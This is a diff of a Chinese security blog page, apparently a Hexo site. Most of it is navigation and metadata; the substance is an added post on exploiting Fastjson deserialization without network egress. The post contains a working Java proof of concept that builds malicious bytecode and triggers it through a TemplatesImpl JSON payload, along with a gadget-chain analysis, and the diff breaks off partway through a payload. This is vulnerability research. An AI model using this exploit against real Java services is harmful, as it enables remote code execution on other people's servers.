@@ -6,25 +6,49 @@
   <meta name="keywords" content=" Hexo , Markdown ">
   <meta name="description" content="Java反序列化-Fastjson不出网利用 | 六月的雨">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-<meta name="description" content="Fastjson不出网利用0x01 Teamplates   0x02 BCEL利⽤链—org.apache.tomcat.dbcp.dbcp2.BasicDataSource2.1 利⽤条件 ⽆需⽬标额外开启选项，也不⽤连接外部服务器 但需要应⽤部署在Tomcat应⽤环境中，因为Tomcat应⽤环境⾃带tomcat-dbcp.jar 对于SpringBoot这种⾃带Tomcat可以直接以单个ja">
+<meta name="description" content="inxedu_cms前言   因酷开源网校系统是由北京因酷时代科技有限公司以下简称（因酷教育软件）研发并推出的国内首家Java版开源网校源代码建站系统，并免费提供给非商业用途用户使用，是用户体验最好、运营功能最全、性价比最高的在线教育软件。 第一次上手一个SSM框架的审计，主要学习一下审计的思路。主要参考自先知社区这篇文章：JAVA代码审计 | 因酷网校在线教育系统 - 先知社区 (aliyun.">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Java反序列化-Fastjson不出网利用">
-<meta property="og:url" content="http://example.com/2021/12/18/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Fastjson%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8/index.html">
+<meta property="og:title" content="java代码审计-inxedu">
+<meta property="og:url" content="http://example.com/2021/12/20/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-inxedu/index.html">
 <meta property="og:site_name" content="六月的雨">
-<meta property="og:description" content="Fastjson不出网利用0x01 Teamplates   0x02 BCEL利⽤链—org.apache.tomcat.dbcp.dbcp2.BasicDataSource2.1 利⽤条件 ⽆需⽬标额外开启选项，也不⽤连接外部服务器 但需要应⽤部署在Tomcat应⽤环境中，因为Tomcat应⽤环境⾃带tomcat-dbcp.jar 对于SpringBoot这种⾃带Tomcat可以直接以单个ja">
+<meta property="og:description" content="inxedu_cms前言   因酷开源网校系统是由北京因酷时代科技有限公司以下简称（因酷教育软件）研发并推出的国内首家Java版开源网校源代码建站系统，并免费提供给非商业用途用户使用，是用户体验最好、运营功能最全、性价比最高的在线教育软件。 第一次上手一个SSM框架的审计，主要学习一下审计的思路。主要参考自先知社区这篇文章：JAVA代码审计 | 因酷网校在线教育系统 - 先知社区 (aliyun.">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211224093044624.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211224101406330.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211224101721116.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211224101843513.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211224101905153.png">
-<meta property="article:published_time" content="2021-12-18T14:00:12.000Z">
-<meta property="article:modified_time" content="2021-12-24T02:48:28.280Z">
+<meta property="og:image" content="https://shu1l.github.io/2021/02/16/ssm-kuang-jia-shen-ji-xue-xi-yin-ku-wang-xiao-zai-xian-jiao-yu-xi-tong-shen-ji/QQ%E6%88%AA%E5%9B%BE20210212114439.png">
+<meta property="og:image" content="https://shu1l.github.io/2021/02/16/ssm-kuang-jia-shen-ji-xue-xi-yin-ku-wang-xiao-zai-xian-jiao-yu-xi-tong-shen-ji/QQ%E6%88%AA%E5%9B%BE20210213172113.png">
+<meta property="og:image" content="https://shu1l.github.io/2021/02/16/ssm-kuang-jia-shen-ji-xue-xi-yin-ku-wang-xiao-zai-xian-jiao-yu-xi-tong-shen-ji/QQ%E6%88%AA%E5%9B%BE20210213172023.png">
+<meta property="og:image" content="https://shu1l.github.io/2021/02/16/ssm-kuang-jia-shen-ji-xue-xi-yin-ku-wang-xiao-zai-xian-jiao-yu-xi-tong-shen-ji/QQ%E6%88%AA%E5%9B%BE20210212111938.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211227220501041.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211227220603447.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211227220632818.png">
+<meta property="og:image" content="https://shu1l.github.io/2021/02/16/ssm-kuang-jia-shen-ji-xue-xi-yin-ku-wang-xiao-zai-xian-jiao-yu-xi-tong-shen-ji/QQ%E6%88%AA%E5%9B%BE20210213173933.png">
+<meta property="og:image" content="https://shu1l.github.io/2021/02/16/ssm-kuang-jia-shen-ji-xue-xi-yin-ku-wang-xiao-zai-xian-jiao-yu-xi-tong-shen-ji/QQ%E6%88%AA%E5%9B%BE20210213174226.png">
+<meta property="og:image" content="https://shu1l.github.io/2021/02/16/ssm-kuang-jia-shen-ji-xue-xi-yin-ku-wang-xiao-zai-xian-jiao-yu-xi-tong-shen-ji/QQ%E6%88%AA%E5%9B%BE20210213174750.png">
+<meta property="og:image" content="https://shu1l.github.io/2021/02/16/ssm-kuang-jia-shen-ji-xue-xi-yin-ku-wang-xiao-zai-xian-jiao-yu-xi-tong-shen-ji/QQ%E6%88%AA%E5%9B%BE20210213174304.png">
+<meta property="og:image" content="https://shu1l.github.io/2021/02/16/ssm-kuang-jia-shen-ji-xue-xi-yin-ku-wang-xiao-zai-xian-jiao-yu-xi-tong-shen-ji/QQ%E6%88%AA%E5%9B%BE20210213121827.png">
+<meta property="og:image" content="https://shu1l.github.io/2021/02/16/ssm-kuang-jia-shen-ji-xue-xi-yin-ku-wang-xiao-zai-xian-jiao-yu-xi-tong-shen-ji/QQ%E6%88%AA%E5%9B%BE20210213122138.png">
+<meta property="og:image" content="https://shu1l.github.io/2021/02/16/ssm-kuang-jia-shen-ji-xue-xi-yin-ku-wang-xiao-zai-xian-jiao-yu-xi-tong-shen-ji/QQ%E6%88%AA%E5%9B%BE20210213175257.png">
+<meta property="og:image" content="https://shu1l.github.io/2021/02/16/ssm-kuang-jia-shen-ji-xue-xi-yin-ku-wang-xiao-zai-xian-jiao-yu-xi-tong-shen-ji/QQ%E6%88%AA%E5%9B%BE20210213180316.png">
+<meta property="og:image" content="https://shu1l.github.io/2021/02/16/ssm-kuang-jia-shen-ji-xue-xi-yin-ku-wang-xiao-zai-xian-jiao-yu-xi-tong-shen-ji/QQ%E6%88%AA%E5%9B%BE20210213121211.png">
+<meta property="og:image" content="https://shu1l.github.io/2021/02/16/ssm-kuang-jia-shen-ji-xue-xi-yin-ku-wang-xiao-zai-xian-jiao-yu-xi-tong-shen-ji/QQ%E6%88%AA%E5%9B%BE20210213121225.png">
+<meta property="og:image" content="https://shu1l.github.io/2021/02/16/ssm-kuang-jia-shen-ji-xue-xi-yin-ku-wang-xiao-zai-xian-jiao-yu-xi-tong-shen-ji/QQ%E6%88%AA%E5%9B%BE20210212122514.png">
+<meta property="og:image" content="https://shu1l.github.io/2021/02/16/ssm-kuang-jia-shen-ji-xue-xi-yin-ku-wang-xiao-zai-xian-jiao-yu-xi-tong-shen-ji/QQ%E6%88%AA%E5%9B%BE20210213182040.png">
+<meta property="og:image" content="https://shu1l.github.io/2021/02/16/ssm-kuang-jia-shen-ji-xue-xi-yin-ku-wang-xiao-zai-xian-jiao-yu-xi-tong-shen-ji/QQ%E6%88%AA%E5%9B%BE20210213182147.png">
+<meta property="og:image" content="https://shu1l.github.io/2021/02/16/ssm-kuang-jia-shen-ji-xue-xi-yin-ku-wang-xiao-zai-xian-jiao-yu-xi-tong-shen-ji/QQ%E6%88%AA%E5%9B%BE20210213182225.png">
+<meta property="og:image" content="https://shu1l.github.io/2021/02/16/ssm-kuang-jia-shen-ji-xue-xi-yin-ku-wang-xiao-zai-xian-jiao-yu-xi-tong-shen-ji/QQ%E6%88%AA%E5%9B%BE20210213115840.png">
+<meta property="og:image" content="https://shu1l.github.io/2021/02/16/ssm-kuang-jia-shen-ji-xue-xi-yin-ku-wang-xiao-zai-xian-jiao-yu-xi-tong-shen-ji/QQ%E6%88%AA%E5%9B%BE20210213185228.png">
+<meta property="og:image" content="https://shu1l.github.io/2021/02/16/ssm-kuang-jia-shen-ji-xue-xi-yin-ku-wang-xiao-zai-xian-jiao-yu-xi-tong-shen-ji/QQ%E6%88%AA%E5%9B%BE20210213185425.png">
+<meta property="og:image" content="https://shu1l.github.io/2021/02/16/ssm-kuang-jia-shen-ji-xue-xi-yin-ku-wang-xiao-zai-xian-jiao-yu-xi-tong-shen-ji/QQ%E6%88%AA%E5%9B%BE20210213185436.png">
+<meta property="og:image" content="https://shu1l.github.io/2021/02/16/ssm-kuang-jia-shen-ji-xue-xi-yin-ku-wang-xiao-zai-xian-jiao-yu-xi-tong-shen-ji/QQ%E6%88%AA%E5%9B%BE20210212133339.png">
+<meta property="og:image" content="https://shu1l.github.io/2021/02/16/ssm-kuang-jia-shen-ji-xue-xi-yin-ku-wang-xiao-zai-xian-jiao-yu-xi-tong-shen-ji/QQ%E6%88%AA%E5%9B%BE20210213183058.png">
+<meta property="og:image" content="https://shu1l.github.io/2021/02/16/ssm-kuang-jia-shen-ji-xue-xi-yin-ku-wang-xiao-zai-xian-jiao-yu-xi-tong-shen-ji/QQ%E6%88%AA%E5%9B%BE20210213183308.png">
+<meta property="og:image" content="https://shu1l.github.io/2021/02/16/ssm-kuang-jia-shen-ji-xue-xi-yin-ku-wang-xiao-zai-xian-jiao-yu-xi-tong-shen-ji/QQ%E6%88%AA%E5%9B%BE20210213183430.png">
+<meta property="article:published_time" content="2021-12-20T06:12:12.000Z">
+<meta property="article:modified_time" content="2021-12-27T14:07:24.557Z">
 <meta property="article:author" content="juneRain">
 <meta property="article:tag" content="Hexo">
 <meta property="article:tag" content="Markdown">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211224093044624.png">
+<meta name="twitter:image" content="https://shu1l.github.io/2021/02/16/ssm-kuang-jia-shen-ji-xue-xi-yin-ku-wang-xiao-zai-xian-jiao-yu-xi-tong-shen-ji/QQ%E6%88%AA%E5%9B%BE20210212114439.png">
 
 
 <link rel="icon" href="/img/1.jpg">
@@ -238,7 +262,7 @@
     <li>
         <div class="all active" data-rel="All">All
             
-                <small>(25)</small>
+                <small>(28)</small>
             
         </div>
     </li>
@@ -288,10 +312,24 @@
         
             
                 <li>
-                    <div data-rel="java代码审计">
+                    <div data-rel="java安全">
                         
-                        java代码审计
+                        java安全
                         <small>(1)</small>
+                        
+                    </div>
+                    
+                </li>
+            
+        
+    
+        
+            
+                <li>
+                    <div data-rel="Java安全">
+                        
+                        Java安全
+                        <small>(7)</small>
                         
                     </div>
                     
@@ -305,7 +343,7 @@
                     <div data-rel="JAVA代码审计">
                         
                         JAVA代码审计
-                        <small>(9)</small>
+                        <small>(10)</small>
                         
                     </div>
                     
@@ -316,10 +354,10 @@
         
             
                 <li>
-                    <div data-rel="Java反序列化">
+                    <div data-rel="SAST自动代码审计">
                         
-                        Java反序列化
-                        <small>(7)</small>
+                        SAST自动代码审计
+                        <small>(1)</small>
                         
                     </div>
                     
@@ -361,8 +399,8 @@
         
     </div>
 </div>
-<input type="hidden" id="yelog_site_posts_number" value="25">
-<input type="hidden" id="yelog_site_word_count" value="49.4k">
+<input type="hidden" id="yelog_site_posts_number" value="28">
+<input type="hidden" id="yelog_site_word_count" value="53.5k">
 <div style="display: none">
     <span id="busuanzi_value_site_uv"></span>
     <span id="busuanzi_value_site_pv"></span>
@@ -422,7 +460,15 @@
     
     <nav id="title-list-nav">
         
-        <a  class="All Java反序列化 "
+        <a  class="All JAVA代码审计 "
+           href="/2021/12/20/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-inxedu/"
+           data-tag="Hexo,Markdown"
+           data-author="" >
+            <span class="post-title" title="java代码审计-inxedu">java代码审计-inxedu</span>
+            <span class="post-date" title="2021-12-20 14:12:12">2021/12/20</span>
+        </a>
+        
+        <a  class="All Java安全 "
            href="/2021/12/18/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Fastjson%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8/"
            data-tag="Hexo,Markdown"
            data-author="" >
@@ -430,15 +476,7 @@
             <span class="post-date" title="2021-12-18 22:00:12">2021/12/18</span>
         </a>
         
-        <a  class="All Java反序列化 "
-           href="/2021/12/18/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CommonsCollections1%E5%88%86%E6%9E%90%20-%20%E5%89%AF%E6%9C%AC/"
-           data-tag="Hexo,Markdown"
-           data-author="" >
-            <span class="post-title" title="Java反序列化-Fastjson漏洞全分析">Java反序列化-Fastjson漏洞全分析</span>
-            <span class="post-date" title="2021-12-18 18:00:12">2021/12/18</span>
-        </a>
-        
-        <a  class="All Java反序列化 "
+        <a  class="All Java安全 "
            href="/2021/12/18/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Fastjson%E6%BC%8F%E6%B4%9E%E5%85%A8%E5%88%86%E6%9E%90/"
            data-tag="Hexo,Markdown"
            data-author="" >
@@ -446,7 +484,15 @@
             <span class="post-date" title="2021-12-18 18:00:12">2021/12/18</span>
         </a>
         
-        <a  class="All Java反序列化 "
+        <a  class="All "
+           href="/2021/12/14/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Shiro%E5%88%86%E6%9E%90/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title=""></span>
+            <span class="post-date" title="2021-12-14 16:18:52">2021/12/14</span>
+        </a>
+        
+        <a  class="All Java安全 "
            href="/2021/12/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CommonsCollections1%E5%88%86%E6%9E%90/"
            data-tag="Hexo,Markdown"
            data-author="" >
@@ -454,7 +500,7 @@
             <span class="post-date" title="2021-12-08 18:00:12">2021/12/08</span>
         </a>
         
-        <a  class="All Java反序列化 "
+        <a  class="All Java安全 "
            href="/2021/12/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-URLDNS%E5%88%86%E6%9E%90/"
            data-tag="Hexo,Markdown"
            data-author="" >
@@ -462,7 +508,15 @@
             <span class="post-date" title="2021-12-08 18:00:12">2021/12/08</span>
         </a>
         
-        <a  class="All Java反序列化 "
+        <a  class="All Java安全 "
+           href="/2021/12/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E5%86%85%E5%AD%98%E9%A9%AC/"
+           data-tag="Hexo,Markdown"
+           data-author="" >
+            <span class="post-title" title="Java反序列化-内存马">Java反序列化-内存马</span>
+            <span class="post-date" title="2021-12-08 18:00:12">2021/12/08</span>
+        </a>
+        
+        <a  class="All Java安全 "
            href="/2021/12/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CommonsCollections2%E5%88%86%E6%9E%90/"
            data-tag="Hexo,Markdown"
            data-author="" >
@@ -470,7 +524,7 @@
             <span class="post-date" title="2021-12-06 22:00:12">2021/12/06</span>
         </a>
         
-        <a  class="All Java反序列化 "
+        <a  class="All Java安全 "
            href="/2021/12/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CommonsCollections3%E5%88%86%E6%9E%90/"
            data-tag="Hexo,Markdown"
            data-author="" >
@@ -542,6 +596,14 @@
             <span class="post-date" title="2021-09-07 23:22:12">2021/09/07</span>
         </a>
         
+        <a  class="All SAST自动代码审计 "
+           href="/2021/09/07/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-codeql%E5%88%86Datagear/"
+           data-tag="Hexo,Markdown"
+           data-author="" >
+            <span class="post-title" title="SAST自动代码审计-Codeql分析Datagear">SAST自动代码审计-Codeql分析Datagear</span>
+            <span class="post-date" title="2021-09-07 23:22:12">2021/09/07</span>
+        </a>
+        
         <a  class="All JAVA代码审计 "
            href="/2021/09/07/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E6%8A%A5%E9%94%992/"
            data-tag="Hexo,Markdown"
@@ -558,7 +620,7 @@
             <span class="post-date" title="2021-09-07 23:22:12">2021/09/07</span>
         </a>
         
-        <a  class="All java代码审计 "
+        <a  class="All java安全 "
            href="/2021/07/07/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Apache-Log4j/"
            data-tag="Hexo,Markdown"
            data-author="" >
@@ -583,10 +645,10 @@
         </a>
         
         <a  class="All JAVA代码审计 "
-           href="/2021/07/07/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E5%8F%8D%E5%B0%84/"
+           href="/2021/07/07/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-java%E9%9D%A2%E5%AF%B9%E5%AF%B9%E8%B1%A1/"
            data-tag="Hexo,Markdown"
            data-author="" >
-            <span class="post-title" title="java代码审计-编程语法">java代码审计-编程语法</span>
+            <span class="post-title" title="java代码审计-面对对">java代码审计-面对对</span>
             <span class="post-date" title="2021-07-07 20:16:12">2021/07/07</span>
         </a>
         
@@ -652,7 +714,7 @@
             <i class="iconfont icon-category"></i>
             
             
-            <a  data-rel="Java反序列化">Java反序列化</a>
+            <a  data-rel="Java安全">Java安全</a>
             
         </span>
         
@@ -669,12 +731,12 @@
     </div>
     <div class="article-meta">
         
-            Created At : <time class="date" title='Updated At: 2021-12-24 10:48:28'>2021-12-18 22:00</time>
+            Created At : <time class="date" title='Updated At: 2021-12-30 16:45:59'>2021-12-18 22:00</time>
         
     </div>
     <div class="article-meta">
         
-        <span>Count:1.3k</span>
+        <span>Count:2.7k</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -704,7 +766,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Fastjson%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8"><span class="toc-text">Fastjson不出网利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-Teamplates"><span class="toc-text">0x01 Teamplates</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-BCEL%E5%88%A9%E2%BD%A4%E9%93%BE%E2%80%94org-apache-tomcat-dbcp-dbcp2-BasicDataSource"><span class="toc-text">0x02 BCEL利⽤链—org.apache.tomcat.dbcp.dbcp2.BasicDataSource</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-1-%E5%88%A9%E2%BD%A4%E6%9D%A1%E4%BB%B6"><span class="toc-text">2.1 利⽤条件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-2-%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="toc-text">2.2 影响版本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-3-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-text">2.3 漏洞复现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#POC%E5%88%86%E6%9E%90"><span class="toc-text">POC分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-4-%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90"><span class="toc-text">2.4 调试分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-4-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90"><span class="toc-text">2.4 利用链分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87-1-2-36-lt-fastjson-lt-1-2-37"><span class="toc-text">绕过 1.2.36&lt;&#x3D;fastjson&lt;1.2.37</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-text"></span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Fastjson%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8"><span class="toc-text">Fastjson不出网利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-text">0x01 TemplatesImpl利用链</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-%E5%88%A9%E2%BD%A4%E6%9D%A1%E4%BB%B6"><span class="toc-text">1.1 利⽤条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="toc-text">1.2 影响版本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-3-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-text">1.3 漏洞复现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-4-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90"><span class="toc-text">1.4 利用链分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-5-POC%E5%88%86%E6%9E%90"><span class="toc-text">1.5 POC分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-BCEL%E5%88%A9%E2%BD%A4%E9%93%BE%E2%80%94org-apache-tomcat-dbcp-dbcp2-BasicDataSource"><span class="toc-text">0x02 BCEL利⽤链—org.apache.tomcat.dbcp.dbcp2.BasicDataSource</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-%E5%88%A9%E2%BD%A4%E6%9D%A1%E4%BB%B6"><span class="toc-text">2.1 利⽤条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="toc-text">2.2 影响版本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-text">2.3 漏洞复现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#POC%E5%88%86%E6%9E%90"><span class="toc-text">POC分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-4-%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90"><span class="toc-text">2.4 调试分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-5-%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-text">2.5 利用链</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-33-lt-fastjson-lt-12-36"><span class="toc-text">1.2.33&lt;&#x3D;fastjson&lt;&#x3D;12.36</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-37-lt-fastjson-lt-1-2-47"><span class="toc-text">1.2.37&lt;&#x3D;fastjson&lt;&#x3D;1.2.47</span></a></li></ol></li></ol></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -720,21 +782,122 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="Fastjson不出网利用"><a href="#Fastjson不出网利用" class="headerlink" title="Fastjson不出网利用"></a>Fastjson不出网利用</h1><h2 id="0x01-Teamplates"><a href="#0x01-Teamplates" class="headerlink" title="0x01 Teamplates"></a>0x01 Teamplates</h2><ul>
-<li></li>
-</ul>
-<h2 id="0x02-BCEL利⽤链—org-apache-tomcat-dbcp-dbcp2-BasicDataSource"><a href="#0x02-BCEL利⽤链—org-apache-tomcat-dbcp-dbcp2-BasicDataSource" class="headerlink" title="0x02 BCEL利⽤链—org.apache.tomcat.dbcp.dbcp2.BasicDataSource"></a>0x02 BCEL利⽤链—org.apache.tomcat.dbcp.dbcp2.BasicDataSource</h2><h2 id="2-1-利⽤条件"><a href="#2-1-利⽤条件" class="headerlink" title="2.1 利⽤条件"></a>2.1 利⽤条件</h2><ul>
+        <h1 id="Fastjson不出网利用"><a href="#Fastjson不出网利用" class="headerlink" title="Fastjson不出网利用"></a>Fastjson不出网利用</h1><p>在Fastjson这个反序列化漏洞中是使⽤ TemplatesImpl 和 JdbcRowSetImpl 、 BasicDataSource 构造恶意<br>代码实现命令执⾏。</p>
+<p>第⼀个利⽤链是常规的Java字节码的执⾏，但是需要开启Feature.SupportNonPublicField，，否则不支持私有属性的传入，存在局限性；<br>第⼆个利⽤链⽤到的是JNDI注⼊，利⽤条件相对较低，但是需要连接远程恶意服务器，在⽬标没外⽹的情况下⽆法直接利<br>⽤；<br>第三个利⽤链也是⼀个字节码的利⽤，但其⽆需⽬标额外开启选项，也不⽤连接外部服务器，利⽤条件更低</p>
+<h2 id="0x01-TemplatesImpl利用链"><a href="#0x01-TemplatesImpl利用链" class="headerlink" title="0x01 TemplatesImpl利用链"></a>0x01 TemplatesImpl利用链</h2><h3 id="1-1-利⽤条件"><a href="#1-1-利⽤条件" class="headerlink" title="1.1 利⽤条件"></a>1.1 利⽤条件</h3><p>1、服务端使⽤parseObject()时，必须使⽤如下格式才能触发漏洞：<br>JSON.parseObject(input, Object.class, Feature.SupportNonPublicField);<br>2、服务端使⽤parse()时，需要 JSON.parse(text1,Feature.SupportNonPublicField);<br>这是因为payload需要赋值的⼀些属性为private属性，服务端必须添加特性才会去从json中恢复private属性的数据</p>
+<h3 id="1-2-影响版本"><a href="#1-2-影响版本" class="headerlink" title="1.2 影响版本"></a>1.2 影响版本</h3><p>Fastjson 1.2.22-1.2.24、JDK1.7u21版本</p>
+<h3 id="1-3-漏洞复现"><a href="#1-3-漏洞复现" class="headerlink" title="1.3 漏洞复现"></a>1.3 漏洞复现</h3><p>POC：</p>
+<pre><code>import com.alibaba.fastjson.JSON;
+import com.alibaba.fastjson.parser.Feature;
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import javassist.*;
+
+import java.util.Base64;
+
+public class poc1 &#123;
+    public static String generateEvil() throws Exception &#123;
+        ClassPool pool = ClassPool.getDefault();
+        CtClass clas = pool.makeClass(&quot;Evil&quot;);
+        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
+        String cmd = &quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;;
+        clas.makeClassInitializer().insertBefore(cmd);
+        clas.setSuperclass(pool.getCtClass(AbstractTranslet.class.getName()));
+
+        clas.writeFile(&quot;./&quot;);
+
+        byte[] bytes = clas.toBytecode();
+        String EvilCode = Base64.getEncoder().encodeToString(bytes);
+        System.out.println(EvilCode);
+        return EvilCode;
+    &#125;
+    public static void main(String[] args) throws Exception &#123;
+        final String GADGAT_CLASS = &quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;;
+        String evil = poc1.generateEvil();
+        String PoC = &quot;&#123;\&quot;@type\&quot;:\&quot;&quot; + GADGAT_CLASS + &quot;\&quot;,\&quot;_bytecodes\&quot;:[\&quot;&quot; + evil + &quot;\&quot;],&#39;_name&#39;:&#39;a.b&#39;,&#39;_tfactory&#39;:&#123;&#125;,\&quot;_outputProperties\&quot;:&#123; &#125;,&quot; + &quot;\&quot;_name\&quot;:\&quot;a\&quot;,\&quot;allowedProtocols\&quot;:\&quot;all\&quot;&#125;\n&quot;;
+        JSON.parseObject(PoC,Object.class, Feature.SupportNonPublicField);
+    &#125;
+&#125;
+</code></pre>
+<p><img src="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211227105320369.png" alt="image-20211227105320369"></p>
+<p>1.<code>_bytecodes</code>为什么需要base64编码？</p>
+<p>位置：<code>DefaultFieldDeserializer.parseField()</code> 71行左右，调用了deserialze函数，跟进</p>
+<p><img src="https://gitee.com/KpLi0rn/BlogImag/raw/master/img/image-20210308224332612.png" alt="image-20210308224332612"></p>
+<p>位置：<code>com/alibaba/fastjson/serializer/ObjectArrayCodec.deserialze()</code> 128行</p>
+<p><img src="https://gitee.com/KpLi0rn/BlogImag/raw/master/img/image-20210308224727999.png" alt="image-20210308224727999"></p>
+<p>位置：<code>com/alibaba/fastjson/parser/JSONScanner.bytesValue()</code> 112行</p>
+<p>进行了base64解码操作</p>
+<p><img src="https://gitee.com/KpLi0rn/BlogImag/raw/master/img/image-20210308224537776.png" alt="image-20210308224537776"></p>
+<p>2.<code>_tfactory</code>为什么为<code>&#123;&#125;</code></p>
+<p>如果我们不传入的话，在最后调用的时候，由于<code>_tfactory</code> 为null，所以直接返回了，就到不了加载字节码的地方，所以我们得想办法传入一个数值让<code>_tfactory</code>最后不为null，而是为<code>TransformerFactoryImpl</code> 实例</p>
+<p><img src="https://gitee.com/KpLi0rn/BlogImag/raw/master/img/image-20210308230859225.png" alt="image-20210308230859225"></p>
+<p><img src="https://gitee.com/KpLi0rn/BlogImag/raw/master/img/image-20210308230732386.png" alt="image-20210308230732386"></p>
+<p>poc中传入的是<code>&#123;&#125;</code> ，让我们来看一下为什么可以</p>
+<p>如果传入的键值为空的话，如果为空会根据类属性定义的类型自动创建实例</p>
+<p><img src="https://gitee.com/KpLi0rn/BlogImag/raw/master/img/image-20210309102508135.png" alt="image-20210309102508135"></p>
+<h3 id="1-4-利用链分析"><a href="#1-4-利用链分析" class="headerlink" title="1.4 利用链分析"></a>1.4 利用链分析</h3><p>Gadget com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</p>
+<pre><code>--&gt;getOutputProperties()
+--&gt;newTransformer()
+--&gt;getTransletInstance()
+--&gt;AbstractTranslet.newInstance()
+--&gt;...
+--&gt;Runtime.exec()
+</code></pre>
+<h3 id="1-5-POC分析"><a href="#1-5-POC分析" class="headerlink" title="1.5 POC分析"></a>1.5 POC分析</h3><pre><code>&#123;
+&quot;@type&quot;:&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;,
+&quot;_bytecodes&quot;:[&quot;evilCode&quot;],
